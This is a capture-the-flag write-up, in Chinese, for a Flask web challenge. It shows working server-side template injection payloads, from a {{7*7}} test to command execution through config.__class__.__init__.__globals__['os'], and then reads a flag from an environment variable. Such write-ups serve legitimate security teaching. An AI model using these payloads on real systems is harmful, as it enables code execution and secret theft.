# Shift-Left, Brain-Right

> **分类：** DevSecOps / Web · **赛事：** KubSTU CTF 2026 Autumn · **难度：** Medium

## 📌 题目

天呐，我真是受够了这些一纳秒挣 50 万美元的 vibe coder……我们刚招了个实习生，给我们做了个课程网站。不光啥功能都跑不起来，他还一口咬定这是传世杰作。我拿 SAST 扫描器扫了一遍，发现了一个挺有料的漏洞。来吧，把它打穿——回头咱俩好好乐一乐 :)

Flag 格式：KubCTF{...}

**附件：** [app.py](../../../assets/Web/Shift-Left,%20Brain-Right/app.py) · [Dockerfile](../../../assets/Web/Shift-Left,%20Brain-Right/Dockerfile) · [report.json](../../../assets/Web/Shift-Left,%20Brain-Right/report.json)

## 🏁 解题思路

### 1. 阅读报告

在报告里我们看到这样一行：`This is highly susceptible to Server-Side Template Injection (SSTI) and Cross-Site Scripting (XSS).`
我们尝试 SSTI。

### 2. 确认 SSTI

```
GET /?course={{7*7}}
```

结果块中返回了 `49`——引擎执行了这个表达式。

### 3. 通过 Flask 上下文实现 RCE

`config` 对象在模板中可用；通过 `__class__.__init__.__globals__` 我们跳进模块的全局变量并拿到 `os`：

```
GET /?course={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

响应：`uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)`——拿到了 RCE。

### 4. 读取 flag

flag 被 GZCTF 平台注入到环境变量 `GZCTF_FLAG` 中：

```
GET /?course={{config.__class__.__init__.__globals__['os'].environ['GZCTF_FLAG']}}
```

我们得到响应：`KubSTU{S46t_1s_C00l_TestTeamHash}`

**Flag:** `KubSTU{S46t_1s_C00l_TestTeamHash}`
